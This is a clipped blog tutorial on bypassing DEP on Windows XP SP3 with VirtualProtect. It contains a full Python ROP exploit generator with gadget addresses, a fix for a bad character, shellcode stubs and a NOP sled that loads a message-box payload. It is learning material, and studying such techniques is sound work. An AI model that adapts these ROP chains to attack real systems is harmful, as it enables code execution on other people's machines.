---
title: "[Learning] Bypassing DEP: VirtualProtect | ISSAC/iss4cf0ng's blog"
source: https://iss4cf0ng.github.io/2026/09/30/2026-9-30-DEP/
source_host: iss4cf0ng.github.io
clip_date: 2026-10-04T20:04:38+08:00
trace_id: 06cf5d17-974b-43c4-b6fe-825f2378f129
content_hash: 71c70654f16780754b971d844eef52cba20f9f82c315f81b133a07efb74001e0
status: synced
tags:
  - Windows逆向
  - 漏洞分析
series: null
feed_source: iss4cf0ng·漏洞利用学习
ai_summary: 利用 `VirtualProtect` 把栈上数据区改为 `PAGE_EXECUTE_READWRITE`（0x40）而非关闭 DEP，即可绕过 DEP 执行 shellcode；难点是 API 地址含坏字符 0x1a，需用 ROP 在内存中修正。
ai_summary_style: key-points
images_status:
  total: 11
  succeeded: 11
  failed_urls: []
notion_page_id: 3ef75244-d011-81e6-8eac-f6b3cd511a05
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 利用 `VirtualProtect` 把栈上数据区改为 `PAGE_EXECUTE_READWRITE`（0x40）而非关闭 DEP，即可绕过 DEP 执行 shellcode；难点是 API 地址含坏字符 0x1a，需用 ROP 在内存中修正。
> 
> - **API 行为：** `VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)` 实际调用 `VirtualProtectEx(-1, ...)`；第四参数须为可写地址（如栈），传 NULL 会失败，成功时 `[EAX]` 非 0。
> - **坏字符问题：** `kernel32!VirtualProtect` 地址 `0x7c801ad8` 含 0x1a（旧系统 EOF），故先用 `0x7c801bd8`，再以 ROP 减 `0x100` 修正；可用 `!mona compare -f exploit_dep.txt -a <payload起始地址>` 定位被破坏字节。
> - **方案一（指针配置参数）：** 用 `edi` 作基址，布局为 edi-0x10 = VirtualProtect、edi-0x04 = jmp esp，`[EDI]=EDI` 为第一参数，edi+0x04=0x400、edi+0x08=0x40，第四参数用 EDI-0x24，后续接 shellcode A（跳转壳）+ ROP + shellcode B。
> - **方案二（常量入栈，脚本更短）：** 直接把 0x400/0x40 等常量摆在栈上作为参数，省去构造参数的长 ROP 链；两种布局均验证可成功绕过 DEP（Windows XP SP3 x86）。
> - **要点：** 编写 ROP exploit 既要懂汇编，也要理解内存布局，并弄清字符为何是坏字符才能针对性修复。

## Introduction

This article is part of my series: **[From Bug To Exploit](https://iss4cf0ng.github.io/FromBugToExploit)**.

In [the previous article](https://iss4cf0ng.github.io/2026/09/27/2026-9-27-DEP/), I mentioned six common methods to bypass DEP:

1.  `ZwSetInformationProcess`
2.  `SetProcessDEPPolicy`
3.  `VirtualProtect`
4.  `WriteProcessMemory`
5.  `VirtualAlloc & memcpy`
6.  `HeapCreate & HeapAlloc & memcpy`

In this article, I will introduce the third method: using the `VirtualProtect` API.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f588847778914e6d.jpg)

## VirtualProtect

According to the [MSDN documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect), this API changes the protection on a region of committed pages in the virtual address space of the calling process.

```cpp
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

The meanings of the four parameters are:

-   `lpAddress`: The starting address of the specified region of virtual memory
-   `dwSize`: The size of the region.
-   `flNewProtect`: We need to use the `PAGE_EXECUTE_READWRITE` constant, which is `0x40`.
-   `lpflOldProtect`: This parameter needs a writable 32-bit space. The API writes the original protection mode of the region (our target) into this space. The best option is to pass an address on the stack. If we pass `NULL`, then the API fails. If it fails, then `[EAX]` is `0`. Otherwise, it is non-zero (usually, it would be `1`).

Therefore, this API does not disable DEP, but changes the protection of the region to executable.

## Preparation

First, let’s disassemble the `kernel32!VirtualProtect` API in WinDbg:

```
uf kernel32!VirtualProtect
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c69441963be0a76b.png)

```
kernel32!VirtualProtect:
7c801ad8 8bff            mov     edi,edi
7c801ada 55              push    ebp
7c801adb 8bec            mov     ebp,esp
7c801add ff7514          push    dword ptr [ebp+14h]
7c801ae0 ff7510          push    dword ptr [ebp+10h]
7c801ae3 ff750c          push    dword ptr [ebp+0Ch]
7c801ae6 ff7508          push    dword ptr [ebp+8]
7c801ae9 6aff            push    0FFFFFFFFh
7c801aeb e875ffffff      call    kernel32!VirtualProtectEx (7c801a65)
7c801af0 5d              pop     ebp
7c801af1 c21000          ret     10h
```

Here, we can see how the API works. It actually calls `kernel32!VirtualProtectEx` and passes `0xFFFFFFFF` (`-1`) as the first parameter.

> Note: Remember that on an x86 operating system, calling conventions such as `__stdcall` and `__cdecl` push parameters from the last one to the first one.

## Writing ROP Exploit Script

The process of developing this ROP exploit script is actually the same as [the previous article](https://iss4cf0ng.github.io/2026/09/27/2026-9-28-DEP/). Therefore, I want to discuss something different.

> Note: If you want to learn how to write a ROP script from scratch, you can refer to [this article](https://iss4cf0ng.github.io/2026/09/25/2026-9-25-DEP/).

While executing the payload, I found that it failed. The reason is that the address of the API, `0x7c801ad8`, contains a bad character, `0x1a`.

To demonstrate this, after running the ROP payload, we can compare the contents of `exploit_dep.txt` with the payload that has been read:

```
!mona compare -f exploit_dep.txt -a 0022fa40
```

> Note: The address `0022fa40` is the starting address of the payload.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f41c9a01de512a39.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0cd6de73f75e2938.png)

To solve this problem, we can directly modify the address in memory by executing shellcode. For instance, instead of using the original address, we use `0x7c801bd8` and change it to `0x7c801ad8` by subtracting `0x100`.

> Note: The character `0x1a` is a bad character because it represents `EOF` in legacy operating systems. This highlights that we usually need to understand why a character is considered a bad character if we want to solve the problem. Of course, we can still configure some essential data by modifying it with shellcode.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3a8a96943325177d.png)

Therefore, the ROP chain for fixing the bad character can be implemented as follows:

```python
rop6 += p32(0x7eb962f5) # XOR EAX,EAX # RETN
rop6 += p32(0x77c4ec2b) # ADD EAX,100 # POP EBP # RETN
rop6 += b'6666' # pop ebp
rop6 += p32(0x7eb873b4) # XCHG EAX,ECX # RETN
rop6 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
rop6 += b'6666' # pop esi
rop6 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
rop6 += b'6666' # pop ebp
rop6 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
rop6 += b'6666' # pop ebp
rop6 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
rop6 += b'6666' # pop ebp
rop6 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
rop6 += b'6666' # retn 0x04
rop6 += b'6666' # pop ebp
rop6 += p32(0x7eb9a916) # SUB DWORD PTR DS:[EAX+4C],ECX # POP ESI # POP EBP # RETN 0x0C
```

My textbook also provides another approach that makes the ROP script smaller. The layout is shown below:

```sql
edi-0x30    : Padding A
edi-0x10    : VirtualProtect
edi-0x0c    : Padding B
edi-0x04    : jmp esp
edi         : Padding C1, the first parameter of the API, dynamically generated, which is, [EDI] = EDI
edi+0x04    : The second parameter, 0x400
edi+0x08    : The third parameter, 0x40
edi+0x0C    : Padding C2, the fourth parameter, dynamically generated, using `EDI-0x24`
edi+0x10    : Shellcode A
edi+0x15    : Padding D, padding to 140 bytes
edi+...     : ROP
edi+...     : Shellcode B
```

Therefore, the completed ROP exploit script, including both implementations, can be implemented as follows:

```python
# exploit.py
# VirtualProtect
# Environment: Windows XP SP3 x86

import struct
import sys

def p32(addr: int) -> bytes:
    return struct.pack('<I', addr)

def read_shellcode() -> bytes:
    shellcode = b''
    with open('messagebox.bin', 'rb') as f:
        shellcode = f.read()

    return shellcode

def sword_three_first() -> bytes:
    # 0x1a: EOF (bad char)
    virtualprotect = p32(0x7c801bd8) # kernel32!VirtualProtect + 0x0100
    jmp_esp = p32(0x7c874f13) # jmp esp

    # initialize EDI
    rop1 = b''
    rop1 += p32(0x7eb9a880) # PUSH ESP # ADD BH,BH # DEC ECX # POP EAX # POP EBP # RETN 0x04
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop1 += b'1111' # retn 0x04
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5b0e7) # PUSH EAX # ADD AL,66 # MOV DWORD PTR DS:[EAX],1B00001 # POP EDI # POP ESI # POP EBP # RETN 0x08
    rop1 += b'1111' # pop esi
    rop1 += b'1111' # pop ebp

    # The first parameter, current address
    rop2 = b''
    rop2 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop2 += b'22222222' # retn 0x08
    rop2 += b'2222' # pop esi
    rop2 += p32(0x7eb32b4c) # MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN
    rop2 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop2 += b'2222' # pop esi
    rop2 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN
    rop2 += b'2222' # pop ebp

    # The second parameter
    rop3 = b''
    rop3 += p32(0x7eba55bd) # XOR EAX,EAX # RETN
    for _ in range(32):
        rop3 += p32(0x77c1d7f5) # ADD EAX,20 # POP EBP # RETN
        rop3 += b'3333' # pop ebp

    rop3 += p32(0x7eb32b4c) # MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN
    rop3 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop3 += b'3333'
    rop3 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop3 += b'3333' # retn 0x04
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN
    rop3 += b'3333' # retn 0x04
    rop3 += b'3333' # pop ebp

    # The third parameter
    rop4 = b''
    rop4 += p32(0x7eba55bd) # XOR EAX,EAX # RETN
    for _ in range(2):
        rop4 += p32(0x77c1d7f5) # ADD EAX,20 # POP EBP # RETN
        rop4 += b'4444' # pop ebp

    rop4 += p32(0x7eb32b4c) # MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN
    rop4 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop4 += b'4444'
    rop4 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop4 += b'4444' # retn 0x04
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop4 += b'4444' # retn 0x04
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop4 += b'4444' # retn 0x04
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN
    rop4 += b'4444' # retn 0x04
    rop4 += b'4444' # pop ebp

    # The fourth parameter
    rop5 = b''
    rop5 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop5 += b'5555' # pop esi
    rop5 += p32(0x77c33127) # ADD EAX,0C # RETN
    rop5 += p32(0x7eb32b4c) # MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN
    rop5 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c14001) # XCHG EAX,ECX # RETN
    rop5 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN
    rop5 += b'5555' # pop ebp

    # fixed bad char
    rop6 = b''
    rop6 += p32(0x7eb962f5) # XOR EAX,EAX # RETN
    rop6 += p32(0x77c4ec2b) # ADD EAX,100 # POP EBP # RETN
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x7eb873b4) # XCHG EAX,ECX # RETN
    rop6 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop6 += b'6666' # pop esi
    rop6 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop6 += b'6666' # retn 0x04
    rop6 += b'6666' # pop ebp
    rop6 += p32(0x7eb9a916) # SUB DWORD PTR DS:[EAX+4C],ECX # POP ESI # POP EBP # RETN 0x0C
    rop6 += b'6666' # retn 0x04
    rop6 += b'6666' # pop esi
    rop6 += b'6666' # pop ebp

    # Call API
    rop7 = b''
    rop7 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop7 += b'7' * 0x0C # retn 0x0c
    rop7 += b'7777' # pop esi
    rop7 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop7 += b'7777' # pop ebp
    rop7 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop7 += b'7777' # pop ebp
    rop7 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop7 += b'7777' # pop ebp
    rop7 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop7 += b'7777' # pop ebp
    rop7 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop7 += b'7777' # pop ebp
    rop7 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop7 += b'7777' # pop ebp
    rop7 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop7 += b'7777' # pop ebp
    rop7 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop7 += b'7777' # pop ebp
    rop7 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop7 += b'7777' # pop ebp
    rop7 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop7 += b'7777' # pop ebp
    rop7 += p32(0x7eb9a9e3) # PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08
    rop7 += b'7777' # pop ebp

    shellcode_A = b'\x89\xe0\x83\xc0\x7f\x83\xc0\x7f\x83\xc0\x7f\x83\xc0\x7f\x83\xc0\x7f\x83\xc0\x7f\xff\xe0'
    shellcode_B = read_shellcode()

    offset = 140

    padding_A = b'AAAA' * 8
    padding_B = b'B' * 8 # retn 0x08 from rop7
    padding_C = b'C' * 0x10 # retn 10h from VirtualProtect
    padding_D = b'D' * (offset - (len(padding_B) + len(padding_C) + len(padding_A) + len(shellcode_A) + len(jmp_esp) + len(virtualprotect)))

    exploit = b''
    exploit += padding_A
    exploit += virtualprotect
    exploit += padding_B
    exploit += jmp_esp
    exploit += padding_C
    exploit += shellcode_A
    exploit += padding_D
    exploit += rop1
    exploit += rop2
    exploit += rop3
    exploit += rop4
    exploit += rop5
    exploit += rop6
    exploit += rop7
    exploit += b'\x90' * 200 # sled
    exploit += shellcode_B

    return exploit

def sword_three_second() -> bytes:
    virtualprotect = p32(0x7c801bd8) # kernel32!VirtualProtect + 0x0100
    jmp_esp = p32(0x7c874f13) # jmp esp

    # Initialize EDI
    rop1 = b''
    rop1 += p32(0x7eb9a880) # PUSH ESP # ADD BH,BH # DEC ECX # POP EAX # POP EBP # RETN 0x04
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop1 += b'1111' # retn 0x04
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5b0e7) # PUSH EAX # ADD AL,66 # MOV DWORD PTR DS:[EAX],1B00001 # POP EDI # POP ESI # POP EBP # RETN 0x08
    rop1 += b'1111' # pop esi
    rop1 += b'1111' # pop ebp

    # Save EDI in [EDI]
    rop2 = b''
    rop2 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'22222222' # retn 0x08
    rop2 += b'2222' # pop esi
    rop2 += p32(0x7eb32b4c) # MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'2222' # pop esi
    rop2 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN
    rop2 += b'2222' # pop ebp

    rop3 = b''
    rop3 += p32(0x77c1f2cf) # ADD EAX,0C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += p32(0x7eb32b4c) # MOV ECX,EAX # MOV EAX,EDX # MOV EDX,ECX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += p32(0x77c14001) # XCHG EAX,ECX # RETN
    rop3 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN
    rop3 += b'3333' # pop ebp

    rop4 = b''
    rop4 += p32(0x7eb962f5) # XOR EAX,EAX # RETN
    rop4 += p32(0x77c4ec2b) # ADD EAX,100 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eb873b4) # XCHG EAX,ECX # RETN
    rop4 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop4 += b'4444' # pop esi
    rop4 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04
    rop4 += b'4444' # retn 0x04
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eb9a916) # SUB DWORD PTR DS:[EAX+4C],ECX # POP ESI # POP EBP # RETN 0x0C
    rop4 += b'4444' # pop esi
    rop4 += b'4444' # pop esi
    rop4 += b'4444' # pop ebp

    rop5 = b''
    rop5 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop5 += b'5' * 0x0C
    rop5 += b'5555' # pop esi
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop5 += b'5555' # pop ebp
    rop5 += p32(0x7eb9a9e3) # PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08
    rop5 += b'5555' # pop esp
    rop5 += b'5555' # pop ebp
    # retn 0x08 left

    # nasm jump.asm -o jump.bin
    # xxd -i jump.bin
    shellcode_A = b'\x89\xe0\x83\xc0\x7f\x83\xc0\x7f\x83\xc0\x7f\x83\xc0\x5f\xff\xe0'
    shellcode_B = read_shellcode()

    offset = 140

    padding_A = b'A' * 0x20
    padding_B = b'B' * 8 # retn 0x08 from rop7
    padding_C1 = b'C' * 0x4
    arg2 = p32(0x400)
    arg3 = p32(0x40)
    padding_C2 = b'C' * 0x4

    virtualprotect = p32(0x7c801bd8) # kernel32!VirtualProtect + 0x0100
    jmp_esp = p32(0x7c874f13) # jmp esp

    padding_D = b'D' * (offset - (len(padding_B) + len(padding_A) + len(shellcode_A) + len(jmp_esp) + len(virtualprotect) + len(padding_C1) + len(padding_C2) + len(arg2) + len(arg3)))

    exploit = b''
    exploit += padding_A
    exploit += virtualprotect
    exploit += padding_B
    exploit += jmp_esp
    exploit += padding_C1
    exploit += arg2
    exploit += arg3
    exploit += padding_C2
    exploit += shellcode_A
    exploit += padding_D
    exploit += rop1
    exploit += rop2
    exploit += rop3
    exploit += rop4
    exploit += rop5
    exploit += b'\x90' * 200
    exploit += shellcode_B

    return exploit

def main():
    try:
        if len(sys.argv) <= 1:
            print(f'Usage: python3 {sys.argv[0]} <Option>')
            print(f'  1: One by One')
            print(f'  2: Textbook method')
            sys.exit(1)

        option = int(sys.argv[1])

        exploit = b''
        if option == 1:
            exploit = sword_three_first()
        elif option == 2:
            exploit = sword_three_second()
        else:
            raise Exception(f'Cannot find option: {option}')

        with open('exploit_dep.txt', 'wb') as f:
            f.write(exploit)

        print('[+] OK')

    except Exception as ex:
        print(ex)

if __name__ == '__main__':
    main()
```

Now, let’s try the first method:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/044c02693e502744.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/62b33f26469cd350.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1a1f0880ae41152d.png)

Let’s try the second method:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/be8db641492507b2.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ff51638d99d18d1a.png)

Both methods can bypass DEP!

## Conclusion

This article introduced how to bypass DEP using the `VirtualProtect` API.

It also introduced two implementations of the memory layout.

The first one is to configure the parameters using pointers.

The other approach is to put constant parameters directly onto the stack.

These highlight that writing a ROP exploit script not only requires an understanding of assembly language, but also an understanding of the memory layout.

In the next article, I will introduce the fourth method of bypassing DEP.

This is the end of this article. If you have any comments or issues, please feel free to leave them below!

## THANKS FOR READING!

I drew a [new drawing](https://www.pixiv.net/artworks/150412149)!

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/646bda4e59f1b154.jpg)

えへへ~
